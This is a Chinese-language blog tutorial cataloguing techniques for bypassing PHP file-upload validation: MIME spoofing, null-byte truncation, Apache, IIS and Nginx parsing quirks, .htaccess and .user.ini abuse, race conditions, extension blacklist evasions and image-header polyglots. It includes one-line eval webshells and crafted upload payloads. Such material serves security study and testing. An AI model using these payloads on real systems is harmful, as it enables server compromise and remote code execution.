<h3 id="客户端javascript-检测-通常为检测文件扩展名"><a href="#客户端javascript-检测-通常为检测文件扩展名" class="headerlink" title="客户端javascript 检测(通常为检测文件扩展名)"></a>客户端javascript 检测(通常为检测文件扩展名)</h3><p>上传时，数据还没有发送出去，浏览器就已经弹出警示框，说明数据还没有发送给服务器，程序就判断出来文件类型不对，因此就可以得出结论这个是通过客户端进行的本地文件检测</p>
<p>这类检测通常在上传页面里含有专门检测文件上传的javascript 代码,最常见的就是检测扩展名是否合法。</p>
<p><strong>绕过方法</strong></p>
<p>1.上传时使用Burpsuite拦截数据包，将木马的扩展名改为原来的php,即可绕过客户端的验证。</p>
<p>2.通过console控制台更改js代码</p>
<h3 id="服务端检测绕过"><a href="#服务端检测绕过" class="headerlink" title="服务端检测绕过"></a>服务端检测绕过</h3><h4 id="0x00-php文件上传相关函数及相关配置"><a href="#0x00-php文件上传相关函数及相关配置" class="headerlink" title="0x00.php文件上传相关函数及相关配置"></a>0x00.php文件上传相关函数及相关配置</h4><h5 id="FILES-参数详解"><a href="#FILES-参数详解" class="headerlink" title="$_FILES 参数详解"></a>$_FILES 参数详解</h5><p>以下<code>$_FILES[&quot;file&quot;]</code>中的<code>file</code>表示表单中设置的name的值</p>
<ul>
<li>$_FILES[“file”][“name”] – 被上传文件的名称</li>
<li>$_FILES[“file”][“type”] – 被上传文件的类型，即MIME类型</li>
<li>$_FILES[“file”][“size”] – 被上传文件的大小，以字节计；$_FILES[“file”][“size”]/1024 即表示以kb为文件大小单位</li>
<li>$_FILES[“file”][“tmp_name”] – 存储在服务器的文件的临时副本的名称；在给PHP发送POST数据包时，如果数据包里包含文件区块，无论访问的代码中是否有处理文件上传的逻辑，php都会将这个文件保存成一个临时文件（通常是/tmp/php[6个随机字符]），这个临时文件在请求结束后就会被删除，因此上传时需要将临时文件移动到某个文件夹下，文件才能被保存到服务器上；这一特性在其他地方如文件包含或命令执行也可能给会被用到；</li>
<li>$_FILES[“file”][“error”] – 由文件上传导致的错误代码</li>
</ul>
<h5 id="is-uploaded-file"><a href="#is-uploaded-file" class="headerlink" title="is_uploaded_file()"></a>is_uploaded_file()</h5><p>函数用法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">is_uploaded_file ( string $filename ) : bool</span><br></pre></td></tr></table></figure>

<p>1.is_uploaded_file() 函数检查指定的文件是否是通过 HTTP POST 上传的；<br>2.如果是POST的话则返回TRUE，否则返回FALSE<br>3.is_uploaded_file[“file”][“tmp_name”]即检查上传的文件是否是POST方式提交的</p>
<h5 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file()"></a>move_uploaded_file()</h5><p>函数用法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool move_uploaded_file( string $filename, string $destination): bool</span><br></pre></td></tr></table></figure>

<p>1.该函数将上传的文件移动到新位置；<br>2.成功移动返回TRUE，移动失败返回FALSE；<br>3.如果目标文件已经存在，则会被覆盖；<br>4.目标路径必须存在；如果目标路径不存在，该函数不会去自动创建；该文件夹需要有可写权限</p>
<h5 id="pathinfo"><a href="#pathinfo" class="headerlink" title="pathinfo()"></a>pathinfo()</h5><p>函数用法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pathinfo ( string $path [, int $options &#x3D; PATHINFO_DIRNAME | PATHINFO_BASENAME | PATHINFO_EXTENSION | PATHINFO_FILENAME ] ) : mixed</span><br></pre></td></tr></table></figure>

<p>1.该函数返回一个关联数组包含有path的信息；path为要解析的路径；如果指定了options，将会返回指定元素；它们包括：PATHINFO_DIRNAME，PATHINFO_BASENAME 和 PATHINFO_EXTENSION 或 PATHINFO_FILENAME；如果没有指定 options 默认是返回全部的单元。</p>
<h5 id="max-execution-time"><a href="#max-execution-time" class="headerlink" title="max_execution_time"></a>max_execution_time</h5><p>php配置中默认的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">max_execution_time &#x3D; 30</span><br></pre></td></tr></table></figure>

<p>即文件上传最久执行时间为30s，超过30s脚步就停止执行；</p>
<p>可以修改上述配置，也可以直接在脚本中加入下面的函数来设定页面最久执行时间：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set_time_limit(0); &#x2F;&#x2F;无限制</span><br></pre></td></tr></table></figure>

<h5 id="post-max-size"><a href="#post-max-size" class="headerlink" title="post_max_size"></a>post_max_size</h5><p>该配置设定POST数据所允许的最大大小</p>
<h5 id="upload-max-filesize"><a href="#upload-max-filesize" class="headerlink" title="upload_max_filesize"></a>upload_max_filesize</h5><p>该配置设定上传文件的最大大小</p>
<h4 id="0x01-服务端MIME类型检测-检测Content-Type-内容"><a href="#0x01-服务端MIME类型检测-检测Content-Type-内容" class="headerlink" title="0x01.服务端MIME类型检测(检测Content-Type 内容)"></a>0x01.服务端MIME类型检测(检测Content-Type 内容)</h4><p>当用户上传文件到服务器端的时候，服务器端的程序会获取上传文件的MIME类型，然后用这个获取到的类型来和期望的MIME类型进行匹配，如果匹配不上则说明上传的文件不合法。</p>
<p><strong>MIME类型是什么？</strong></p>
<p>在把输出结果传送到浏览器上的时候，浏览器必须启动应用程序来处理这个输出文档。这可以通过多种类型MIME（多功能网际邮件扩充协议）来完成。<br>在HTTP中，MIME类型被定义在Content-Type header中。</p>
<p>常见的MIME类型：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.html          text&#x2F;html </span><br><span class="line">.txt          text&#x2F;plain </span><br><span class="line">.gif          image&#x2F;gif </span><br><span class="line">.jpg          image&#x2F;jpeg   </span><br><span class="line">.png          image&#x2F;png  </span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>设置检测文件的类型，可以通过burpsuite来修改文件的类型进行过滤即可</p>
<p>小技巧：如果允许上传jpg类型的文件，则可以先将木马后缀加上<code>.jpg</code>，上传时抓包，拦截得到的Content-Type为jpg类型，再将<code>.jpg</code>去掉即可。这样就不用去修改Content-Type类型了</p>
<h4 id="0x02-0x00截断"><a href="#0x02-0x00截断" class="headerlink" title="0x02.0x00截断"></a>0x02.0x00截断</h4><p>当文件系统读到<code>0x00</code>时，会认为文件名已经结束。</p>
<h5 id="上传路径可控"><a href="#上传路径可控" class="headerlink" title="上传路径可控"></a>上传路径可控</h5><p>使用<code>0x00</code>截断需要满足以下条件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php版本小于5.3.4</span><br><span class="line">php的magic_quotes_gpc为OFF状态</span><br></pre></td></tr></table></figure>

<p>如果文件后缀被白名单限制为<code>.jpg</code>，但上传路径可控：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$img_path &#x3D; $_GET[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br></pre></td></tr></table></figure>

<p>则在路径中，可以使用<code>0x00</code>截断的方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;Pass-11&#x2F;index.php?save_path&#x3D;..&#x2F;upload&#x2F;yijuhua.php%00 HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;yijuhua.jpg&quot;</span><br></pre></td></tr></table></figure>

<p>则上传的文件名会以<code>yijuhua.php</code>形式存放到<code>../upload</code>中</p>
<p>如果路径是以<code>$_POST</code>方式传递的，则需要将<code>.</code>替换成<code>0x00</code>，而不是<code>%00</code>，因为POST传递的值不会经URL解码，具体方法：</p>
<p>使用burp，抓到数据后点开<code>hex</code>，将倒数第一个小数点对应的<code>2e</code>改成<code>00</code>即可</p>
<h5 id="move-uploaded-file-（CVE-2015-2348）"><a href="#move-uploaded-file-（CVE-2015-2348）" class="headerlink" title="move_uploaded_file() （CVE-2015-2348）"></a>move_uploaded_file() （CVE-2015-2348）</h5><p>漏洞影响版本必须在5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7</p>
<p>如果文件上传代码中有：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(!move_uploaded_file($_FILES[&#39;uploaded&#39;][&#39;tmp_name&#39;], $target_path)</span><br></pre></td></tr></table></figure>

<p>那么可用<code>0x00</code>截断的方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">move_uploaded_file($_FILES[&#39;name&#39;][&#39;tmp_name&#39;],&quot;&#x2F;file.php\x00.jpg&quot;);</span><br></pre></td></tr></table></figure>

<p>这本应该创建一个名为file.php\x00.jpg的文件，但实际上创建的文件是file.php</p>
<h4 id="0x03-Apache文件解析特性"><a href="#0x03-Apache文件解析特性" class="headerlink" title="0x03.Apache文件解析特性"></a>0x03.Apache文件解析特性</h4><h5 id="多后缀名"><a href="#多后缀名" class="headerlink" title="多后缀名"></a>多后缀名</h5><p>摘自vulhub：</p>
<p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType text&#x2F;html .html</span><br><span class="line">AddLanguage zh-CN .cn</span><br></pre></td></tr></table></figure>

<p>其给.html后缀增加了media-type，值为text/html；给.cn后缀增加了语言，值为zh-CN。此时，如果用户请求文件index.cn.html，他将返回一个中文的html页面。</p>
<p>以上就是Apache多后缀的特性。如果运维人员给.php后缀增加了处理器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddHandler application&#x2F;x-httpd-php .php</span><br></pre></td></tr></table></figure>

<p>那么，在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p>
<hr>
<p>测试环境：windows10，Apache/2.4.23，PHP/5.5.38</p>
<p>在phpstudy网站目录存放一张<code>a.jpg</code>图片，将其改名为<code>a.jpg.abc</code>，再用浏览器去访问这张图片，发现被成功解析为图片：</p>
<p><img src="https://i.imgur.com/Esh8CaF.jpg" alt="img"></p>
<p>那么现在在网站目录存放一个<code>ma.php</code>文件，里面内容为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &#39;good&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>再将其改名为<code>ma.php.abc</code>，访问这个文件：</p>
<p><img src="https://i.imgur.com/eXPvVPb.jpg" alt="img"></p>
<p>发现其并没有被解析，而是直接将里面的内容显示了出来，这是因为Apache本身并不懂php，而是将这个文件交给php解释器，php解释器和Apache有着不同的解析规则；</p>
<p>在<code>phpStudy\PHPTutorial\Apache\conf\extra</code>找到<code>httpd-php.conf</code>这个配置文件，打开可以看到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.php$&quot;&gt;</span><br><span class="line">    SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>我们可以知道，只有当文件名后缀为<code>.php</code>时，文件才能被当做php执行，那么现在将其改为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.php\.&quot;&gt;</span><br><span class="line">    SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>重启phpstudy，可以看到<code>ma.php.abc</code>已经可以被解析了：</p>
<p><img src="https://i.imgur.com/9xAZSdp.png" alt="img"></p>
<h5 id="罕见后缀"><a href="#罕见后缀" class="headerlink" title="罕见后缀"></a>罕见后缀</h5><p>在某些情况下，不只是php，就连<code>phtml</code>、<code>pht</code>、<code>php3</code>、<code>php4</code>和<code>php5</code>都是Apache和php认可的php程序的文件后缀</p>
<h5 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h5><p>Apache提供了一种很方便的、可作用于当前目录及其子目录的分布式配置文件：<code>.htaccess</code></p>
<p>要使.htaccess文件生效，需要在Apache的配置文件中写上(这里我的配置文件中默认就有以下配置)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AllowOverride All</span><br><span class="line"></span><br><span class="line">LoadModule rewrite_module modules&#x2F;mod_rewrite.so</span><br></pre></td></tr></table></figure>

<p>之后，我们测试用.htaccess文件修改php解释器配置：</p>
<p>新建一个<code>.htaccess</code>文件，由于windows不支持文件名以小数点开头，需要用到cmd命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &gt; .htaccess</span><br></pre></td></tr></table></figure>

<p>这样即可生成<code>.htaccess</code>文件；在这个文件里面写入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;xxx&quot;&gt;  </span><br><span class="line">    SetHandler application&#x2F;x-httpd-php  </span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>即让php解释器将文件名中含有<code>xxx</code>的文件解析为php</p>
<p>在此<code>.htaccess</code>目录创建<code>a.xxx</code>文件，在里面写入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &#39;good&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>发现其被解析成了php：</p>
<p><img src="https://i.imgur.com/tvHQklR.png" alt="img"></p>
<p>将<code>a.xxx</code>改名为<code>xxx.abc</code>，也是会被解析为php的</p>
<h4 id="0x04-IIS6-0解析特性"><a href="#0x04-IIS6-0解析特性" class="headerlink" title="0x04.IIS6.0解析特性"></a>0x04.IIS6.0解析特性</h4><p>IIS6.0属于winserver下的服务器</p>
<p>asp即 active server pages，是microsoft公司开发的服务端脚本环境，可用来创建动态交互式网页并建立强大的web应用程序</p>
<p>1.目录名包含<code>.asp</code>、<code>.asa</code>、<code>.cer</code>的话，则该目录下的所有文件都将按照asp解析</p>
<p>2.文件名中如果包含.asp;、.asa;、.cer;则优先使用asp解析，如<code>asa.asa;asa.jpg</code></p>
<h4 id="0x05-Nginx解析特性"><a href="#0x05-Nginx解析特性" class="headerlink" title="0x05.Nginx解析特性"></a>0x05.Nginx解析特性</h4><p>1.Nginx版本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nginx 0.5.*</span><br><span class="line">Nginx 0.6.*</span><br><span class="line">Nginx 0.7 &lt;&#x3D; 0.7.65</span><br><span class="line">Nginx 0.8 &lt;&#x3D; 0.8.37</span><br></pre></td></tr></table></figure>

<p>以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg.php进行请求</p>
<p>2.Nginx版本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nginx 0.8.41 – 1.5.6：</span><br></pre></td></tr></table></figure>

<p>以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg%20.php进行请求</p>
<h4 id="0x06-PHP-CGI解析漏洞"><a href="#0x06-PHP-CGI解析漏洞" class="headerlink" title="0x06.PHP CGI解析漏洞"></a>0x06.PHP CGI解析漏洞</h4><p>版本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IIS 7.0&#x2F;7.5</span><br><span class="line">Nginx &lt; 0.8.3</span><br></pre></td></tr></table></figure>

<p>以上的容器版本中默认php配置文件cgi.fix_pathinfo=1时，上传一个存在于白名单的扩展名文件shell.jpg，在请求时以shell.jpg/shell.php请求，会将shell.jpg以php来解析</p>
<h4 id="0x07-user-ini"><a href="#0x07-user-ini" class="headerlink" title="0x07 .user.ini"></a>0x07 .user.ini</h4><p>不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以使用.user.ini</p>
<p>php.ini是php默认的配置文件，其中包含了很多php的配置，.user.ini实际上就是一个可以由用户自定义的php.ini</p>
<p>测试环境：windows10，PHPStudy php-5.6.27-nts+Nginx</p>
<p>在网站根目录创建一个<code>.user.ini</code>文件(cmd echo &gt; .user.ini)，写入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto_append_file&#x3D;test.jpg</span><br></pre></td></tr></table></figure>

<p>之后创建一个<code>test.jpg</code>文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(@$_GEET[&#39;shell&#39;] &#x3D;&#x3D; &#39;test&#39;)&#123;</span><br><span class="line">	phpinfo();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>之后，访问正常的php文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1&#x2F;index.php</span><br></pre></td></tr></table></figure>

<p>加上参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1&#x2F;index.php?shell&#x3D;test</span><br></pre></td></tr></table></figure>

<p>即可看到页面执行了phpinfo</p>
<h4 id="0x08-条件竞争"><a href="#0x08-条件竞争" class="headerlink" title="0x08.条件竞争"></a>0x08.条件竞争</h4><p>Web服务器处理多用户请求时，是并发进行的，如果并发处理不当或者是相关的逻辑操作设计的不合理时，就可能导致条件竞争漏洞。</p>
<p>例如：将文件上传到服务器，然后检查上传的文件的类型，如果不符合条件就删除。</p>
<p>但是，如果我们采用多线程的方式访问上传的文件，总有一次我们在文件删除之前就访问到了这个文件，如果这个文件是php的一句话木马，就在服务器中执行了这个木马</p>
<p>具体方法：</p>
<p>使用<code>burp intruder</code>，在<code>payload</code>中选择<code>Null payloads</code>，在下面<code>Generate</code>后输入请求次数，之后点击<code>start attack</code>，即可不断的上传文件</p>
<h4 id="0x09-后缀检测不完全"><a href="#0x09-后缀检测不完全" class="headerlink" title="0x09.后缀检测不完全"></a>0x09.后缀检测不完全</h4><h5 id="1-后缀名大小写绕过"><a href="#1-后缀名大小写绕过" class="headerlink" title="1.后缀名大小写绕过"></a>1.后缀名大小写绕过</h5><p>如果在与黑名单比较前没有将后缀进行大小写统一的话：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br></pre></td></tr></table></figure>

<p>可以通过大小写绕过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.pHp</span><br><span class="line">.PHP</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h5 id="2-在后缀名后加空格"><a href="#2-在后缀名后加空格" class="headerlink" title="2.在后缀名后加空格"></a>2.在后缀名后加空格</h5><p>如果在与黑名单比较前没有将文件名首尾去空的话：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br></pre></td></tr></table></figure>

<p>可以通过在文件名后加空格绕过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filename&#x3D;&quot;yijuhua.php  &quot;</span><br></pre></td></tr></table></figure>

<h5 id="3-后缀名双写绕过"><a href="#3-后缀名双写绕过" class="headerlink" title="3.后缀名双写绕过"></a>3.后缀名双写绕过</h5><p>如果是黑名单且过滤机制仅仅是替换一次不合法后缀：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$file_name &#x3D; str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br></pre></td></tr></table></figure>

<p>可以进行双写绕过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filename&#x3D;&quot;yijuhua.pphphp&quot;</span><br></pre></td></tr></table></figure>

<p>str_ireplace() 函数替换字符串中的一些字符（不区分大小写）。</p>
<p>函数用法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str_ireplace(find,replace,string,count)</span><br><span class="line"></span><br><span class="line">find     必需。规定要查找的值。</span><br><span class="line">replace     必需。规定替换 find 中的值的值。</span><br><span class="line">string     必需。规定被搜索的字符串。</span><br><span class="line">count     可选。一个变量，对替换数进行计数。</span><br></pre></td></tr></table></figure>

<h4 id="0x11-Windows解析特性"><a href="#0x11-Windows解析特性" class="headerlink" title="0x11.Windows解析特性"></a>0x11.Windows解析特性</h4><h5 id="文件后缀的点"><a href="#文件后缀的点" class="headerlink" title="文件后缀的点"></a>文件后缀的点</h5><p>如果服务器是windows系统，且在与黑名单比较前没有将文件后缀的点进行过滤：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br></pre></td></tr></table></figure>

<p>可以在文件名后加点后再上传：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filename&#x3D;&quot;yijuhua.php.&quot;</span><br></pre></td></tr></table></figure>

<p>windows服务器收到这个文件后，会自动忽略掉后面的点</p>
<p>结合0x06，如果过滤机制如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">$file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">$file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">$file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">$file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br></pre></td></tr></table></figure>

<p>可以在文件名后加点+空格+点：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filename&#x3D;&quot;yijuhua.php. .&quot;</span><br></pre></td></tr></table></figure>

<h5 id="DATA"><a href="#DATA" class="headerlink" title="::$DATA"></a>::$DATA</h5><p>如果服务器是windows系统，且在与黑名单比较前没有将文件名中的<code>::$DATA</code>去除：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br></pre></td></tr></table></figure>

<p>可以在文件名后加上这个字符串再上传：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filename&#x3D;&quot;yijuhua.php::$DATA&quot;</span><br></pre></td></tr></table></figure>

<p>php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理</p>
<h4 id="0x10-file-put-contents-与file-exists-特性"><a href="#0x10-file-put-contents-与file-exists-特性" class="headerlink" title="0x10.file_put_contents()与file_exists()特性"></a>0x10.file_put_contents()与file_exists()特性</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$filename &#x3D; __DIR__ . &#39;&#x2F;tmp&#x2F;&#39; . $_GET[&#39;name&#39;]; </span><br><span class="line">$data &#x3D; $_GET[&#39;info&#39;]; </span><br><span class="line">file_put_contents($filename, $data); &#x2F;&#x2F; ...一些处理 </span><br><span class="line">if (file_exists($filename)) &#123; </span><br><span class="line">    unlink($filename); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>unlink — 删除文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool unlink( string $filename[, resource $context] )</span><br></pre></td></tr></table></figure>

<h5 id="方法一-条件竞争"><a href="#方法一-条件竞争" class="headerlink" title="方法一.条件竞争"></a>方法一.条件竞争</h5><h5 id="方法二-函数特性"><a href="#方法二-函数特性" class="headerlink" title="方法二.函数特性"></a>方法二.函数特性</h5><p>ph大佬总结的：</p>
<p>查看php源码，其实我们能发现，php读取、写入文件，都会调用<code>php_stream_open_wrapper_ex</code>来打开流，而判断文件存在、重命名、删除文件等操作则无需打开文件流。 我们跟一跟<code>php_stream_open_wrapper_ex</code>就会发现，其实最后会使用<code>tsrm_realpath</code>函数来将filename给标准化成一个绝对路径。而文件删除等操作则不会，这就是二者的区别。 所以，如果我们传入的是文件名中包含一个不存在的路径，写入的时候因为会处理掉<code>../</code>等相对路径，所以不会出错；判断、删除的时候因为不会处理，所以就会出现“No such file or directory”的错误。</p>
<p>payload1：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;xxxxx&#x2F;..&#x2F;1.php </span><br></pre></td></tr></table></figure>

<p>（这个方法是仅限Linux，因为Windows的文件操作API也会处理文件路径）</p>
<p>payload2：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;1.php&#x2F;.</span><br></pre></td></tr></table></figure>

<h4 id="0x11-上传图片马"><a href="#0x11-上传图片马" class="headerlink" title="0x11.上传图片马"></a>0x11.上传图片马</h4><p>cmd生成命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy a.jpg&#x2F;b+a.php shell.jpg</span><br></pre></td></tr></table></figure>

<p>图片马上传成功后，若服务端存在文件包含漏洞，则(可能)可以被利用</p>
<p>一句话木马格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;</span><br></pre></td></tr></table></figure>

<p>如果php版本小于7，还可用以下写法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language&#x3D;php&gt;@eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;acript language&#x3D;php&gt;system(&quot;ls&quot;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h5 id="文件头检测"><a href="#文件头检测" class="headerlink" title="文件头检测"></a>文件头检测</h5><p>在文件首部加上如下16进制数据，后面跟一句话木马即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JFIF    FF D8 FF E0 00 10 4A 46 49 46</span><br><span class="line">GIF89a  47 49 46 38 39 61</span><br><span class="line">PNG     89 50 4E 47</span><br></pre></td></tr></table></figure>

<h5 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h5><p>服务端会获取上传的图片信息，之后会通过这些信息来生成一个新的图片</p>
<p>情形：</p>
<p>详情参考<a href="https://xz.aliyun.com/t/2657#toc-13">https://xz.aliyun.com/t/2657#toc-13</a></p>
<p><strong>GIF</strong><br>直接对比上传前后图像那些部分没有被渲染，在没有被渲染的地方插入木马即可</p>
<p><strong>PNG</strong></p>
<p><strong>JPG</strong><br>脚本保存为<code>jpg_payload.php</code>，再准备张图片，之后用cmd：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php jpg_payload.php a.jpg</span><br></pre></td></tr></table></figure>

<h4 id="0x12-Boundary"><a href="#0x12-Boundary" class="headerlink" title="0x12.Boundary"></a>0x12.Boundary</h4><p>尝试在boundary等号后加空格、使boundary边界不一致等在某些情况下可绕过waf</p>
<h4 id="0x13-imagemagick邂逅getimagesize"><a href="#0x13-imagemagick邂逅getimagesize" class="headerlink" title="0x13.imagemagick邂逅getimagesize"></a>0x13.imagemagick邂逅getimagesize</h4><p>直接放上p牛的链接吧(目前难以读懂…)：</p>
<p><a href="https://www.leavesongs.com/PENETRATION/when-imagemagick-meet-getimagesize.html">https://www.leavesongs.com/PENETRATION/when-imagemagick-meet-getimagesize.html</a></p>
<hr>
<p>参考链接：</p>
<p><a href="https://blog.csdn.net/xiaojianpitt/article/details/6856536">https://blog.csdn.net/xiaojianpitt/article/details/6856536</a></p>
<p><a href="https://xz.aliyun.com/t/2435">https://xz.aliyun.com/t/2435</a></p>
<p><a href="http://phpstudy.php.cn/jishu-php-3234.html">http://phpstudy.php.cn/jishu-php-3234.html</a><br><a href="https://jingyan.baidu.com/article/3ea5148981f81752e61bba16.html">https://jingyan.baidu.com/article/3ea5148981f81752e61bba16.html</a></p>
<p><a href="https://www.cnblogs.com/cyjaysun/p/4390930.html">https://www.cnblogs.com/cyjaysun/p/4390930.html</a></p>
<p><a href="http://wonderkun.cc/index.html/?p=626">http://wonderkun.cc/index.html/?p=626</a><br><a href="https://xz.aliyun.com/t/2657#toc-1">https://xz.aliyun.com/t/2657#toc-1</a></p>
<p><a href="https://xz.aliyun.com/t/337#toc-1">https://xz.aliyun.com/t/337#toc-1</a></p>
<p><a href="https://www.jianshu.com/p/aa08d99a98aa">https://www.jianshu.com/p/aa08d99a98aa</a></p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
</search>
